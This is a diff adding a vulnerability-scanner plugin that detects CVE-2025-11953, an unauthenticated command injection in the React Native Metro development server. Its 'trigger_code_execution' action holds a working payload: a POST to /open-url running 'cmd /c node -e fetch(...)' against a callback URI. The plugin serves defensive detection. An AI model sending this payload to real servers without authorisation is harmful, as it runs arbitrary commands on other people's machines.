@@ -1,0 +1,81 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "ReactNativeCli_CVE_2025_11953"
+  author: "Giacomo Coluccelli (giacomo@doyensec.com), Alessandro Versari (alessandro.versari@doyensec.com)"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2025-11953"
+  }
+  severity: CRITICAL
+  title: "CVE-2025-11953: Remote Code Execution in Metro Development Server via React Native CLI"
+  description: "The Metro Development Server, which is opened by the React Native Community CLI, binds to external interfaces by default. The server exposes an endpoint that is vulnerable to OS command injection. This allows unauthenticated network attackers to send a POST request to the server and run arbitrary executables. On Windows, the attackers can also execute arbitrary shell commands with fully controlled arguments."
+  recommendation: "Update @react-native-community/cli-server-api to version 20.0.0 or higher, which includes a fix for this vulnerability, in each of your react-native projects."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2025-11953"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_react_native_cli"
+  http_request: {
+    method: GET
+    uri: "/status"
+    response: {
+      expect_all: {
+        conditions: [
+          { header: { name: "x-react-native-project-root" } contains: "" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "trigger_code_execution"
+  http_request: {
+    method: POST
+    uri: "/open-url"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"url\":\"cmd /c node -e fetch(\\\"{{ T_CBS_URI }}\\\").then(console.log)\"}"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_react_native_cli",
+    "trigger_code_execution",
+    "check_callback_server_logs"
+  ]
+}
